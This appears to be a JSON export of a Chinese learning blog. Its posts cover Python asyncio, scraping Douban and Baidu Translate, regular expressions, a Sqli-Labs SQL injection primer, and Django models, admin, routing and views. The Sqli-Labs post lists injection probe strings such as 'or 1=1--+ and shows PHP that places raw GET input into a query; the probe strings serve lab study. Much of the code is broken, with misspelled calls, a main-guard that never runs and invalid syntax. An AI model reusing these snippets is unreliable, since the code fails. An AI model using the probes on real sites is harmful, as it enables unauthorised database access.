asyncio.sleep(2) print(4) tasks = [ asyncio.ensure_future(func1()), asyncio.ensure_future(func2())]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) __注意：遇到IO阻塞自动切换输出结果 1234513--------停顿24 协程的意义在线程中如果遇到IO等待时间，线程可利用空闲时间干其他的事情 2.1 案例：下载三张图片 普通方式12345678910111213141516171819202122import requestimport timedef download(url): name = url.rsplit(&quot;/&quot;, 1)[1] res = requests.get(url) with open(name, mode=&quot;wb&quot;) as f: f.write(res.content) print(name + &quot;Finish.&quot;)if &quot;__name__&quot; == &quot;__main__&quot;: url_list = [ &quot;https://img-baofun.zhhainiao.com/pcwallpaper_ugc/preview/3760b2031ff41ca0bd80bc7a8a13f7bb_preview.mp4&quot;, &quot;https://img-baofun.zhhainiao.com/market/97ba6b60662ab4f31ef06cdf5a5f8e94_preview.mp4&quot;, &quot;https://wallpaperm.cmcm.com/scene/preview_video/750c4e56cb120056c9d155b63025c564_preview.mp4&quot;] start = time.time() for i in url_list: download(i) stop = time.time() print(stop - start) 协程方式1234567891011121314151617181920212223242526272829import asyncioimport aiohttpimport timeasync def download(session, url): async with session.get(url) as response: content = response.content.read() file_name = url.rsplit(&quot;/&quot;, 1)[1] with open(file_name, mode=&quot;wb&quot;) as f: f.write(content) print(file_name + &quot; &quot; +&quot;done&quot;)async def main(): async with aiohttp.ClientSession as session: url_list = [ &quot;https://img-baofun.zhhainiao.com/pcwallpaper_ugc/preview/3760b2031ff41ca0bd80bc7a8a13f7bb_preview.mp4&quot;, &quot;https://img-baofun.zhhainiao.com/market/97ba6b60662ab4f31ef06cdf5a5f8e94_preview.mp4&quot;, &quot;https://wallpaperm.cmcm.com/scene/preview_video/750c4e56cb120056c9d155b63025c564_preview.mp4&quot;] taaks = [asyncio.creat_task(download(session, url)) for url in url_list] await async.wait(tasks)if &quot;__name__&quot; == &quot;__main__&quot;: start = time.time() loop = asyncio.get_event_loop() loop.run_until_complete(main()) stop = time.time() print(stop - start) done","categories":[],"tags":[],"author":"Dokey_"},{"title":"python爬虫-class03","slug":"python爬虫-class03","date":"2021-06-29T15:04:42.000Z","updated":"2023-03-25T14:35:06.451Z","comments":true,"path":"48022.html","link":"","permalink":"http://example.com/48022.html","excerpt":"","text":"豆瓣TOP250排行爬取12345678910111213141516171819202122232425import requestsimport reimport csvurl = &quot;https://movie.douban.com/top250&quot;headers = &#123; &quot;user-agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36&quot;&#125;resp = requests.get(url, headers=headers)page_result = resp.textobj = re.compile(r&#x27;&lt;li&gt;.*?&lt;div class=&quot;item&quot;&gt;.*?&lt;span class=&quot;title&quot;&gt;(?P&lt;name&gt;.*?)&lt;/span&gt;.*?&lt;p class=&quot;&quot;&gt;.*?&lt;br&gt;(?P&lt;year&gt;.*?)&amp;nbsp.*?&lt;span class=&quot;rating_num&quot; property=&quot;v:average&quot;&gt;(?P&lt;rating&gt;.*?)&lt;/span&gt;.*?&lt;span&gt;(?P&lt;evaluate&gt;.*?)人评价&lt;/span&gt;&#x27;, re.S)result = obj.finditer(page_result)f = open(&quot;data.csv&quot;, mode=&quot;w&quot;)csvwrite = csv.write(f)for i in result: dic = i.groupdict() dic[&#x27;year&#x27;] = dic[&#x27;year&#x27;].strip() csvwrite.writerow(dit.values())f.close()print(&quot;done&quot;) done","categories":[],"tags":[],"author":"Dokey_"},{"title":"python爬虫-class02","slug":"python爬虫-class02","date":"2021-06-28T14:52:35.000Z","updated":"2023-03-25T14:35:06.449Z","comments":true,"path":"31575.html","link":"","permalink":"http://example.com/31575.html","excerpt":"","text":"爬虫小程序02（获取豆瓣TOP电影）123456789101112131415161718import requestsurl =&quot;https://movie.douban.com/j/chart/top_list&quot;param = &#123; &quot;type&quot;: &quot;24&quot;, &quot;interval_id: &quot;100:90&quot;, &quot;action: &quot;&quot;, &quot;start: 0 &quot;limit: 1&#125;headers = &#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36&quot;&#125;# 此处需要做一下反爬，通过User-Agentresp = requests.get(url, params=param, headers=headers)print(resp.json())resp.close() done 数据解析概述主要三种解析方式 re解析 bs4解析 xpath解析 这三种解析方式可以混合进行使用，完全以结果做向导，只要能拿到数据，方式不重要，后续需考虑性能的问题。 正则表达式Regular Expression，正则表达式，一种使用表达式的方式对字符串进行匹配的语法规则正则的优点：速度快，效率高，准确性高正则的缺点：新手上手难度大元字符：具有固定含义的特殊符号 常用元字符： . 匹配除换行符以外的任意字符 \\w 匹配字母或数字或下划线 \\s 匹配任意空白符 \\d 匹配数字 \\n 匹配一个换行符 \\t 匹配一个制表符 ^ 匹配字符串的开始 $ 匹配字符串的结尾 \\W 匹配非字母或数字或下划线 \\D 匹配非数字 \\S 匹配非空白符 a|b 匹配字符a或字符b () 匹配括号内的表达式，也表示一个组 […] 匹配字符组中的字符 [^…] 匹配除了字符组中的所有字符 量词：控制前面的元字符出现的次数 “*” 重复零次或更多次 “+” 重复一次或更多次 ? 重复零次或一次 {n} 重复n次 {n, } 重复n次或更多次 {n, m} 重复n到m次 贪婪匹配和惰性匹配 .* 贪婪匹配（尽可能多的去匹配） .*? 惰性匹配（尽可能少的去匹配） re模块 findall 查找所有，返回list123lst = re.findall(&quot;m&quot;, &quot;mai le fo len, mai ni mei&quot;)print(lst) #[&#x27;m&#x27;,&#x27;m&#x27;,&#x27;m&#x27;]lst = re.findall(r&quot;\\d+&quot;, &quot;5点之前，你要给我5000万&quot;) #[&#x27;5&#x27;,&#x27;5000&#x27;] search 会进行匹配，但是如果匹配到第一个结果，就会返回结果。如果匹配不上search返回则是None12ret = re.search(r&quot;\\d&quot;, &quot;5点之前，你要给我5000万&quot;).group()print(ret) # 5 match 只能从字符串的开头进行匹配12ret = re.match(&#x27;a&#x27;, &#x27;abc&#x27;).group()print(ret) # a finditer 和findall差不多,只不过返回的是迭代器123it = re.finditer(&quot;m&quot;, &quot;mai le fo len, mai ni mei&quot;)for el in it: print(el.group()) #依然需要进行分组 compile() 可以将一个较长的正则进行预加载,方便后续使用123obj = re.compile(r&quot;\\d&#123;3&#125;&quot;) # 将正则表达式编译成一个正则表达式对象,规则要匹配的是3个数字ret = obj.search(&quot;abc123eeee&quot;) # 正则表达式对象调用search,参数为待匹配的字符串print(ret.group()) # 结果: 123 正则中的内容如何单独提取单独获取到正则中的具体内容可以给分组起名字123456789s = &quot;&quot;&quot;&lt;div class = &#x27;西游记&#x27;&gt;&lt;span id = &#x27;10010&#x27;&gt;中国联通&lt;/span&gt;&lt;/div&gt;&quot;&quot;&quot;obj = re.compile(r&quot;&lt;span id=&#x27;(?P&lt;name&gt;\\w+)&#x27;&gt;(?P&lt;name&gt;\\w+)&lt;/span&gt;&quot;, re.S)result = obj.search(s)print(result.group()) # 结果: &lt;span id=&#x27;10010&#x27;&gt;中国联通&lt;/span&gt;print(result.group(&quot;id&quot;)) # 结果: 10010 获取id组的内容print(result.group(&quot;name&quot;)) # 结果: 中国联通 获取name组的内容","categories":[],"tags":[],"author":"Dokey_"},{"title":"python爬虫-class01","slug":"python爬虫-class01","date":"2021-06-28T13:47:51.000Z","updated":"2023-03-25T14:35:06.448Z","comments":true,"path":"31255.html","link":"","permalink":"http://example.com/31255.html","excerpt":"","text":"爬虫基础网页渲染基础服务器渲染:在服务器那边直接把数据和html整合在一起，统一返回给浏览器。在页面源代码中能看到数据客户端渲染:第一次请求只要一个html骨架，第二次请求拿到数据，进行数据展示。在页面源代码中看不到数据 HTTP协议协议：就是两个计算机之间为了能够流畅的进行沟通设置的协议。常见的协议有TCP&#x2F;IP，SOAP协议，HTTP协议，SMTP协议等。 HTTP协议把一条消息分为三大块内容。无论是请求还是响应都是三块内容 请求： 请求行 -&gt; 请求方式 请求url地址 协议 请求头 -&gt; 服务器需要使用的附加信息 请求体 -&gt; 请求参数 响应： 状态行 -&gt; 协议 状态码 响应头 -&gt; 客户需要使用的附加信息 响应体 -&gt; 服务器返回的正真客户端要用的内容（HTML，json）等 请求头中常见的一些重要内容（爬虫需要） User-Agent: 请求载体的身份标识（用什么发送的请求） Referer：防盗链（请求从哪来，反爬） cookie：本地字符串数据信息（用户登录信息，发爬的token） 响应头中一些重要内容 cookie：本地字符串信息（用户登录信息） 各种神奇的莫名其妙的字符串（token字样，防止各种攻击和反爬） 测试爬虫小程序获取百度翻译列表 123456789import requestsurl = &quot; https://fanyi.baidu.com/sug&quot;s = input(&quot;请输入：&quot;)data = &#123; &quot;kw&quot;: s&#125;resp = requests.post(url, data=data)print(resp.json())","categories":[],"tags":[],"author":"Dokey_"},{"title":"Sqli Labs-01","slug":"Sqli-Labs-01","date":"2021-03-03T02:38:49.000Z","updated":"2023-03-25T14:35:06.440Z","comments":true,"path":"5706.html","link":"","permalink":"http://example.com/5706.html","excerpt":"","text":"基础知识SQL注入分类基于从服务器接收到的响应 基于错误SQL注入 联合查询的类型 堆查询注射 SQL盲注 基于布尔SQL盲注 基于时间的SQL盲注 基于报错的SQL盲注 基于如何处理输入的SQL查询（数据类型） 基于字符串 数字或整数为基础的 基于程度和顺序的注入（哪里发生了影响） 一阶注入 二阶注入一阶注入是指输入的输入语句对WEB直接产生了影响，出现了结果；二阶注入是指输入提交的语句无法直接对WEB应用程序产生影响，通过对其他的辅助间接对WEB产生危害。 系统函数 version() – MySQL版本 user() – 数据库用户名 database() – 数据库名 @@datadir – 数据库路径 @@version_compile_os – 操作系统版本 字符连接函数 concat(str1,str2,…) – 没有分隔符的连接字符串 concat_ws(separator,str1,str2,…) – 含有分隔符地连接字符串 group_concat(str1,str2,…) – 连接一个组的所有字符串，并以逗号分隔每一条数据三个函数能一次性查出所有信息 一般用于尝试的语句PS: –+可以用#替换，url提交过程中编码后为%23 1234567or 1=1--+&#x27;or 1=1--+&quot;or 1=1--+)or 1=1--+&#x27;)or 1=1--+&quot;)or 1=1--+))or 1=1--+ 一般代码为： 12$id = $_GET[&#x27;id&#x27;];$sql = &quot;SELECT * FROM users WHERE id = &#x27;$id&#x27; LIMIT 0,1&quot;; UNION操作符介绍UNION操作符用于合并两个或多个SELECT语句的结果集。请注意，UNION内部的SELECT语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条SELECT语句中的列顺序必须相同。SQL UNION 语法SELECT column_name(s) FROM table_name1UNIONSELECT column_name(s) FROM table_name2另外，UNION结果集中列名总是等于UNION中的第一个SELECT语句中的列名。","categories":[],"tags":[],"author":"Dokey_"},{"title":"Django字段类型","slug":"Django字段类型","date":"2021-02-23T02:57:18.000Z","updated":"2023-03-25T14:35:06.419Z","comments":true,"path":"48213.html","link":"","permalink":"http://example.com/48213.html","excerpt":"","text":"Django field types介绍字段类型AutoField它是一个根据ID自增长的IntegerField字段。通常不必直接使用该字段。如果没在别的字段上指定主键，Django就会自动添加主键字段。 BigIntegerField64位整数，类似于IntegerField，范围从-9223372036854775808 到9223372036854775807。默认的form widget 是TextInput。 BooleanField一个布尔值(true&#x2F;false)字段。默认的form widget是CheckboxInput。如果要使用null作为空值，可使用NullBooleanField。 CharField1class CharField(max_length=None[,**options]) 它是一个字符串字段，对小写字符和大写字符都适用。CharField有一个必须传入的参数：max_length，字段的最大字符数。它作用于数据库层级和Django的数据验证层级。 DateField1class DateField([auto_now=False,auto_now_add=False,**options]) 该字段利用Python的datetime.date实例来表示日期 DateField.auto_now: 每一次保存对象时,Django都会自动将该字段的值设置为当前时间.一般用来表示”最后修改时间”.要注意使用的是当前日期,而非默认值,所以不能通过重写默认值的办法来改变保存时间. DateField.auto_now_add: 在第一次创建对象时,Django都会自动将该字段的值设置为当前时间,一般用来表示对象创建时间.它使用的同样是当前日期,而非默认值. 默认的form widget是TextInput。Note:当auto_now或者auto_now_add设置为True时，字段会有editable&#x3D;True和blank&#x3D;True的设定。 EmailField1class EmailField([max_length=75, **options]) 它是带有email合法性检测的CharFieldNote: 最大长度默认为75,并不能存储所有与RFC3696&#x2F;5321兼容的email地址,如果要存储所有,请设置max_length&#x3D;254,设置为75是历史遗留问题 FileField1class FileField(upload_to=None[,max_length=100,**options]) 文件上传字段Note: 该字段不支持primary_key和unique参数,否则会抛出TypeError异常它有一个必须的参数:FileField.upload_to用于保存文件的本地文件系统,它根据MEDIA_ROOT设置确定该文件的url属性.该路径可以包含时间格式串strftime(),可以在上传文件的时候替换成当时日期&#x2F;时间(这样就不会出现在上传文件把某个目录塞满的情况了)该参数也可以是一个可调用项,比如是一个函数,可以调用函数获得包含文件名的上传路径,这个可调用项必须要接收两个参数","categories":[],"tags":[],"author":"Dokey_"},{"title":"Django学习笔记-07","slug":"Django学习笔记-07","date":"2021-02-22T14:22:00.000Z","updated":"2023-03-25T14:35:06.438Z","comments":true,"path":"57874.html","link":"","permalink":"http://example.com/57874.html","excerpt":"","text":"Django Admin 管理工具Django自动管理工具是django.contrib的一部分。可以在项目的settings.py中的INSTALLED_APPS设置： settings.py 文件代码12345678INSTALLED_APPS = ( &#x27;django.contrib.admin&#x27;, &#x27;django.contrib.auth&#x27;, &#x27;django.contrib.contenttypes&#x27;, &#x27;django.contrib.sessions&#x27;, &#x27;django.contrib.messages&#x27;, &#x27;django.contrib.staticfiles&#x27;,) 激活管理工具通常在生成项目时会在urls.py中自动设置好配置项如下所示： urls.py 文件代码1234567# urls.pyfrom django.conf.urls import urlfrom django.contrib import adminurlpatterns = [ url(r&#x27;amdin/&#x27;, admin.site.urls),] 使用管理工具通过命令python manage.py createsuperuser来创建超级用户。为了让admin界面管理某个数据模型，需要先注册该数据模型到admin。 admin.py 文件代码1234from django.contrib import adminfrom TestModel.models import Testadmin.site.register(Test) 复杂模型管理页面的功能强大,完全有能力处理更加复杂的数据模型;在models.py中增加一个更复杂的数据模型\\ models.py 文件代码1234567891011121314151617from django.db import modelsclass Test(models.Model): name = models.CharField(max_length=20)class Contact(models.Model): name = models.CharField(max_length=200) age = models.IntegerField(default=0) emali = models.EmailField() def __unicode__(self): # 作用:美化打印出来的结果 return self.nameclass Tag(models.Model): contact = models.ForeignKey(Contact, on_delete=models.CASCADE,) name = models.CharField(max_length=50) def __unicode__(self): return slef.name 这里有两个表,Tag以Contact为外部键,一个Contact可以对应多个Tag.IntegerField用于存储整数在admin.py中注册多个模型并显示 admin.py 文件代码1234from django.contrib import adminfrom TestModel.models import Test, Tag, Contactamdin.site.register([Test, Contact, Tag]) 使用以下命令来创建表结构12$ python manage.py makemigrations Testmodel$ python manage.py migrate TestModel #创建表结构 自定义表单自定义管理页面: 在”add”页面只想显示name和email部分,修改admin.py 12345678from django.contrib import adminfrom TestModel.models import Test, Contact, Tagclass ContactAdmin(admin.ModelAdmin): fields = (&#x27;name&#x27;,&#x27;email&#x27;) admin.site.register(Contact,ContactAdmin) admin.site.register([Test, Tag]) 以上代码定义了一个ContactAdmin类,用以说明管理页面的显示格式.里面的fields属性定义了要显示的字段.由于该类对应的是Contact数据模型,在注册时也需要将它们一起注册. 输入分栏块,每个栏块也可以定义自己的格式admin.py 文件代码1234567891011121314from django.contrib import adminfrom TestModel.models import Test, Contact, Tagclass ContactAdmin(amdin.ModelAdmin): fieldsets = ( [&#x27;Main&#x27;,&#123; &#x27;fields&#x27;:(&#x27;name&#x27;,&#x27;email&#x27;), &#125;], [&#x27;Advance&#x27;,&#123; &#x27;fields&#x27;:(&#x27;age&#x27;,), &#125;] )admin.site.register(Contact, ContactAdmin)admin.site.register([Test, Tag]) 内联(Inline)显示上面的Contact是Tag的外部键,所以有外部参考的关系在默认的页面显示中,将两者分离开来,无法体现出两者的从属关系,我们可以使用内联显示,让Tag附加在Contact的编辑页面显示. admin.py 文件代码12345678910111213141516171819from django.contrib import adminfrom TestModel.models import Test, Contact, Tagclass TagInline(admin.TabularInline): # TabularInline类用于在A页面上编辑B表的字段 model = Tagclass ContactAdmin(admin.ModelAdmin): inlines = [TagInline] # Inline fieldsets = ( [&#x27;Main&#x27;,&#123; &#x27;fields&#x27;:(&#x27;name&#x27;, &#x27;email&#x27;), &#125;], [&#x27;Advence&#x27;,&#123; &#x27;classes&#x27;:(&#x27;collapse&#x27;,), &#x27;fields&#x27;:(&#x27;age&#x27;,), &#125;] )admin.site.register(Contact, ContactAdmin)admin.site.register([Test]) 列表页显示自定义页面的显示,比如在列表中显示更多的栏目,子需要在ContactAdmin中增加list_display属性: admin.py 文件代码12345678910111213141516171819from django.contrib import adminfrom TestModel.models import Test, Contact, Tagclass TagInline(admin.TabularInline): model = Tagclass ContactAdmin(admin.ModelAdmin): list_display= (&quot;name&quot;, &quot;age&quot;, &quot;email&quot;) inlines = [TagInline] fieldsets = ( [&#x27;Main&#x27;,&#123; &#x27;fields&#x27;:(&#x27;name&#x27;,&#x27;email&#x27;), &#125;], [&#x27;Advance&#x27;,&#123; &#x27;classes&#x27;:(&#x27;collapse&#x27;,), &#x27;fields&#x27;:(&#x27;age&#x27;,), &#125;] )admin.site.register(Contact, ContactAdmin)admin.site.register([Test]) 搜索功能在管理大量记录时非常有用,可以使用search_fields为该列表页增加搜索栏: amdin.py 文件代码1234567891011121314151617181920from django.contrib import adminfrom TestModel.models import Test, Contact, Tagclass TagInline(admin.TabularInline): model = Tagclass ContactAdmin(admin.ModelAdmin): list_display = (&#x27;name&#x27;,&#x27;age&#x27;,&#x27;email&#x27;) search_fields = (&#x27;name&#x27;,) inlines = [TagInline] fieldsets = ( [&#x27;Main&#x27;:&#123; &#x27;fields&#x27;:(&#x27;name&#x27;,&#x27;email&#x27;), &#125;], [&#x27;Advance&#x27;:&#123; &#x27;classes&#x27;:(&#x27;collapse&#x27;,), &#x27;fields&#x27;:(&#x27;age&#x27;,), &#125;] )admin.site.register(Contact, ContactAdmin)admin.site.register([Test])","categories":[{"name":"Django","slug":"Django","permalink":"http://example.com/categories/Django/"}],"tags":[],"author":"Dokey_"},{"title":"Django学习笔记-06","slug":"Django学习笔记-06","date":"2021-02-20T15:03:00.000Z","updated":"2023-03-25T14:35:06.433Z","comments":true,"path":"8915.html","link":"","permalink":"http://example.com/8915.html","excerpt":"","text":"Django 模型数据库配置创建MySQL数据库（ORM无法操作到数据库级别，只能操作到数据表）语法： 1create database test default charset=utf8; settings.py文件中DATABASES配置项：123456789101112DATABASES = &#123; &#x27;default&#x27;: &#123; &#x27;ENGINE&#x27;: &#x27;django.db.backends.mysql&#x27;, #数据库引擎 &#x27;NAME&#x27;: &#x27;test&#x27;, #数据库名称 &#x27;HOST&#x27;: &#x27;127.0.0.1&#x27;, #数据库地址 &#x27;PORT&#x27;: &#x27;3306&#x27;, #数据库端口 &#x27;USER&#x27;: &#x27;root&#x27;, #数据库用户名 &#x27;PASSWORD&#x27;: &#x27;123456&#x27;, #数据库密码 &#125;&#125; 使用pymysql模块连接mysql数据库：123#在与settings.py同级下的__init__.py中引入模块和进行配置import pymysqlpymysql.install_as_MySQLdb() 定义模型创建APPDjango规定，如果要使用模型，必须创建一个app，使用以下命令创建一个TestModel的app： 1django-admin startapp TestModel 修改TestModel&#x2F;models.py文件12345#models.pyfrom django.db import modelsclass Test(models.Model): name = models.CharField(max_length=20) 以上的类名代表了数据库表名，且继承了models.Model，类里面的字段代表数据库中的字段（name），数据类型则由CharField（相当于varchar）、Datefield（相当于datetime），max_length参数限定长度 接下来需要在settings.py中的INSTALLED_APP中添加APP名称（TestModel）在命令行中运行以下命令：12$python3 manage.py migrate #创建表结构$python3 manage.py makemigrations #迁移 表名组成结构为：应用名_类名（如：TestModel_test）注意：尽管我们没有在models给表设置主键，但是Django会自动添加一个id作为主键。 数据库操作urls.py123456from django.urls import pathfrom . import views,testdburlpatterns = [ path(&#x27;testdb/&#x27;, testdb.testdb),] 添加数据（testdb.py）添加数据需要先创建对象，然后再执行save函数，相当于SQL中的INSERT： 1234567from django.http import HttpResponsefrom TestModel.models import Testdef test(request): test1 = Test(name = &#x27;Dokey&#x27;) test1.save() return HttpResponse(&quot;&lt;p&gt;数据添加成功！&lt;/p&gt;&quot;) 获取数据（testdb.py）Django提供了多种方式来获取数据库的内容 12345678910111213141516171819202122232425262728293031from django.http import HttpResponsefrom TestModel.models import Testdef testdb(request): # 初始化 response = &quot;&quot; response1 = &quot;&quot; # 通过objects这个模型管理器的all()获得所有数据行，相当于SQL中的SELECT * FROM list = Test.objects.all() # filter相当于SQL中的WHERE，可设置条件过滤结果 response2 = Test.objects.filter(id=1) # 获取单个对象 response3 = Test.objects.get(id=1) # 限制返回的数据 相当于SQL中的 OFFSET 0 LIMIT 2; Test.objects.order_by(&#x27;name&#x27;)[0:2] # 数据排序 Test.objects.order_by(&quot;id&quot;) # 上面的方法可以连锁使用 Test.objects.filter(name=&quot;dokey&quot;).order_by(&quot;id&quot;) # 输出所有数据 for var in list: response1 += var.name + &quot; &quot; response = response1 return HttpResponse(&quot;&lt;p&gt;&quot; + response + &quot;&lt;/p&gt;&quot;) 更新数据修改数据可以使用save()或update() 123456789101112131415from django.http import HttpResponsefrom TestModel,models import Testdef testdb(request): test1 = Test.objects.get(id=1) test1.name = &quot;Okay Dokey&quot; test1.save() # 第二种方式 Test.objects.filter(id=1).update(name=&quot;Okay Dokey yo&quot;) # 修改所有的列 Test.objects.all().update(name=&quot;Dokey&quot;) return HttpResponse(&quot;&lt;p&gt;修改成功！&lt;/p&gt;&quot;) 删除数据删除数据库中的对象只需调用该对象的delete()方法即可： 1234567891011121314from django.http import HttpResponsefrom django TestModel.models import Testdef testdb(request): tets1 = Test.objects.filter(id=1) test1.delete() # 第二种方式 Test.objects.filter(id=1).delete() # 删除所有数据 Test.objects.all().delete() return HttpResponse(&quot;&lt;p&gt;删除成功！&lt;/p&gt;&quot;)","categories":[{"name":"Django","slug":"Django","permalink":"http://example.com/categories/Django/"}],"tags":[],"author":"Dokey_"},{"title":"Django学习笔记-05","slug":"Django学习笔记-05","date":"2021-02-20T09:05:42.000Z","updated":"2023-03-25T14:35:06.430Z","comments":true,"path":"9107.html","link":"","permalink":"http://example.com/9107.html","excerpt":"","text":"Django 路由路由简单来说就是根据用户请求的URL链接来判断对应的处理程序，并返回处理结果，也就是URL与Django的视图建立映射关系。Django路由在urls.py配置，urls.py中的每一条配置对应相应的处理方法。 Django 不同版本urls.py配置有点不一样：Django 1.1.x版本url()方法：普通路径和正则路径均可使用，需要自己手动添加正则首位限制符号。 1234567from django.conf.urls import urlurlpatterns = [ url(r&#x27;^%admin/$&#x27;, admin.site.urls), url(r&#x27;^index/$&#x27;, views.index), #普通路径 url(r&#x27;^articles/([0-9]&#123;4&#125;)/$&#x27;, views.articles) #正则路径] Django 2.2.x之后的版本 path：用于普通路径，不需要自己手动添加正则首位限制符号，底层已经添加。 re_path:用于正则路径，需要自己手动添加正则首位限制符号。1234567from django.urls import re_pathurlpatterns = [ path(&#x27;admin/&#x27;, admin.site.urls), path(&#x27;index/&#x27;,views.index), #普通路径 re_path(r&#x27;^articles/[0-9]&#123;4&#125;/$&#x27;, views.articles), #正则路径] 总结：Django1.1.x版本中的url和Django2.2.x版本中的re_path用法相同。 正则路径中的分组正则路径中的无名分组无名分组按位置传参,一一对应.views.py中除了request,其他形参的数量要与urls中的分组数量一致. urls.py 文件代码12345678from django.urls import re_pathfrom . import viewsfrom django.contrib import adminurlpatterns = [ path(&#x27;admin/&#x27;, admin.site.urls), re_path(r&#x27;index/([0-9]&#123;4&#125;)/$&#x27;, views.index),] views.py 文件代码12345from django.shortcuts import HttpResponsedef index(request, year): print(year) # 一个形参代表路径中一个分组的内容,按顺序匹配 return HttpResponse(&quot;Dokey&quot;) 正则路径中的有名分组1语法: (?P&lt;组名&gt;正则表达式) 有名分组按关键字传参,与位置顺序无关.views.py中除了request,其他形参的数量要与urls中的分组数量一致,并且views中的形参名称要与urls中的组名对应. urls.py 文件代码12345678from django.urls import re_pathfrom django.contrib import adminfrom . import views urlpatterns = [ path(r&#x27;admin/&#x27;, admin.site.urls), re_path(&#x27;^index/(?P&lt;year&gt;[0-9]&#123;4&#125;)/(?P&lt;month&gt;[0-9]&#123;2&#125;)/$&#x27;, views.index)] 路由分发存在问题: Django项目中多个app目录共用一个urls容易造成混淆,后期维护也不方便.解决: 使用路由分发(include),让每个app目录都单独拥有自己的urls.步骤: 让每个app目录里都创建一个urls.py文件. 在项目名称目录下的urls文件里,同意将路径分给各个app目录. 12345678from django.contrib import adminfrom django.urls import path, includeurlpatterns = [ path(&#x27;admin/&#x27;, admin.site.urls), path(&quot;app01&quot;, include(&quot;app01.urls&quot;)), path(&quot;app02&quot;, include(&quot;app02.urls&quot;)),] 在各自app目录下,写自己的urls.py文件,进行路由跳转. app01目录:123456from django.urls import path,re_pathfrom app01 import views # 从自己的app目录引入viewsurlpatterns = [ re_path(r&#x27;^login/(?P&lt;m&gt;[0-9]&#123;2&#125;)/$&#x27;, views.index,),] app02目录:123456from django.urls import path, re_pathfrom app02 import viewsurlpatterns = [ re_path(r&#x27;^xxx/(?P&lt;n&gt;[0-9]&#123;4&#125;)/$&#x27;, views.xxx),] 反向解析随着功能的增加,路由层的url发生变化,就需要去更改对应的视图层和模板层的url,不便维护.这时我们可以利用方向解析,当路由层url发生变化,在视图层和模板层动态反向解析出更改后的url,免去修改的操作.反向解析一般用在模板中的超链接及视图中的重定向. 普通路径在urls.py中给路由起别名, name&#x3D;”路由别名”. 1path(&#x27;login/&#x27;,views.login, name=&quot;login&quot;) 在views.py中,从django.urls中引入reverse,利用 reverse(“路由别名”) 反向解析. 12345678910111213from django.http import HttpResponsefrom django.shortcuts import render,redirect, reversedef login(request): if request.method == &#x27;GET&#x27;: renturn HttpResponse(&quot;Okay Dokey&quot;) else: username = request.POST.get(&quot;username&quot;) pwd = request.POST.get(&quot;pwd&quot;) if username == &#x27;Okay&#x27; and pwd == &#x27;Dokey&#x27;: return HttpResponse(&quot;Okay Dokey yo&quot;) else: return reverse(redirect(&#x27;login&#x27;)) 反向解析语法. 12# 反向解析语法&#123;% url &quot;路由别名&quot; %&#125; 在templates中 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h3&gt;用户登录&lt;/h3&gt; &lt;form action=&quot;&#123;% url name=&quot;login&quot; %&#125;&quot; method=&quot;post&quot;&gt; &lt;p&gt;用户名: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt; &lt;p&gt;密码: &lt;input tyep=&quot;text&quot; name=&quot;pwd&quot;&gt;&lt;/p&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"Django","slug":"Django","permalink":"http://example.com/categories/Django/"}],"tags":[],"author":"Dokey_"},{"title":"Django学习笔记-04","slug":"Django学习笔记-04","date":"2021-02-20T06:46:39.000Z","updated":"2023-03-25T14:35:06.429Z","comments":true,"path":"58194.html","link":"","permalink":"http://example.com/58194.html","excerpt":"","text":"Django视图视图层视图函数简称视图，是一个简单Python函数，它接受Web请求并且返回Web响应。响应可以是一个HTML页面、一个404错误页面、重定向页面、XML文档。每个视图函数都负责返回一个HttpResponse对象，对象中包含生成的响应。 视图层中有两个重要的对象：请求对象（request）与响应对象（HttpResponse）。 请求对象：HttpRequest对象（简称request对象） GET 数据类型是QueryDict,一个类似于字典的对象，包含HTTP GET的所有参数。 取值格式：对象.方法 get()：返回字符串，如果该键对应有多个值，取出该键的最后一个值 123def runoob(request): name = request.GET.get(&quot;name&quot;) return HttpResponse(&#x27;姓名：&#123;&#125;&#x27;.format(name)) 2. #### POST 常用于form表单，form表单里的标签name属性对应参数的键，value属性对应参数的值 取值格式：对象.方法 get()：返回字符串，如果该键对应有多个值，取出该键的最后一个值。 123def runoob(request): name = request.POST.get(&quot;name&quot;) return HttpResponse(&quot;姓名：&#123;&#125;&quot;.format(&quot;name&quot;)) 3. #### body 数据类型是二进制字节流，是原生请求体里的参数内容，在HTTP中用于POST，因为GET没有请求体。 在处理非HTTP形式的报文时非常有用，例如：二进制图片、XML、Json等。 1234def runoob(request): name request.body print(name) return HttpResponse(&quot;Okay Dokey&quot;) 4. #### Path 获取URL中的路径部分，数据类型是字符串。 1234def runoob(request): name = request.path print(name) return HttpResponse(&quot;Okay Dokey&quot;) 5. #### method 获取当前请求的方式，数据类型是字符串，且结果为大写。 1234def runoob(request): name = request.method print(name) return HttpResponse(&quot;Okay Dokey&quot;) 响应对象：HttpResponse对象 响应对象主要有三种形式：HttpResponse()、render()、redirect()。 HttpResponse()：返回文本，参数为字符串，字符串中写文本内容。如果参数为字符串里含有html标签，也可以渲染。 12def runoob(request): return HttpResponse(&quot;&lt;a herf=&#x27;https://www.baidu.com&#x27;&gt;Okay Dokey&lt;/a&gt;&quot;) render()：返回文本，第一个参数为request，第二个参数为字符串（页面名称）,第三个参数为字典（可选参数，向页面传递的参数：键为页面参数名，值为views参数名）。 123def runoob(request): name = &quot;Okay Dokey&quot; return render(request, &#x27;runoob.html&#x27;, &#123;&quot;name&quot;: name&#125;) redirect：重定向，跳转新页面。参数为字符串，字符串中填写页面路径。一般用于form表单提交后，跳转到新页面。 12def runoob(request): return redirect(&quot;/index/&quot;)render和redirect是在HttpResponse的基础上进行了封装： render：底层返回的也是HttpResponse对象 